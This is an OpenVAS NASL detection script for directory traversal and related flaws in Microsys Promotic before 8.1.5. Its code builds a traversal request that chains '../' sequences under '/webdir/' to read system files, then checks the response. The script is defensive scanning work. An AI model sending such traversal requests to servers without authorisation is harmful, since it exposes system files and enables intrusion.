##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_microsys_promotic_mult_vuln_win.nasl 4622 2016-11-25 06:51:16Z cfi $
#
# Microsys Promotic Multiple Vulnerabilities (Windows)
#
# Authors:
# Arun kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation allows attackers to cause stack or heap based buffer
  overflow or disclose sensitive information or execute arbitrary code within
  the context of the affected application.
  Impact Level: System/Application";

tag_affected = "Promotic versions prior to 8.1.5 on Windows";
tag_insight = "Multiple flaws due to,
  - Error in PmWebDir object in the web server.
  - Error in 'vCfg' and 'sID' parameters in 'SaveCfg()'and 'AddTrend()' methods
    within the PmTrendViewer ActiveX control.";
tag_solution = "Upgrade to Promotic version 8.1.5 or later,
  For updates refer to http://www.promotic.eu/en/index.htm";
tag_summary = "This host is installed with Microsys Promotic and is prone to
  multiple vulnerabilities.";

if(description)
{
  script_id(803660);
  script_version("$Revision: 4622 $");
  script_cve_id("CVE-2011-4520", "CVE-2011-4519", "CVE-2011-4518");
  script_bugtraq_id(50133);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-11-25 07:51:16 +0100 (Fri, 25 Nov 2016) $");
  script_tag(name:"creation_date", value:"2013-06-17 17:30:15 +0530 (Mon, 17 Jun 2013)");
  script_name("Microsys Promotic Multiple Vulnerabilities (Windows)");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46430");
  script_xref(name : "URL" , value : "http://www.promotic.eu/en/pmdoc/News.htm#ver80105");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/promotic_1-adv.txt");
  script_xref(name : "URL" , value : "http://ics-cert.us-cert.gov/advisories/ICSA-12-024-02");
  script_summary("Check if Promitic is prone to Directory traversal");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
sndReq = "";
rcvRes = "";
port = 0;
files = "";
url = "";

## Get HTTP port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Get request
sndReq = http_get(item:"/webdir/index.htm", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

if(rcvRes &&  ">Promotic" >< rcvRes)
{
  ## traversal_files() function Returns Dictionary (i.e key value pair)
  ## Get Content to be checked and file to be check
  files = traversal_files();

  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    url = string("/webdir/",crap(data:"../",length:3*15), files[file]);

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:port, url:url,pattern:file))
    {
      report = report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }
  }
}
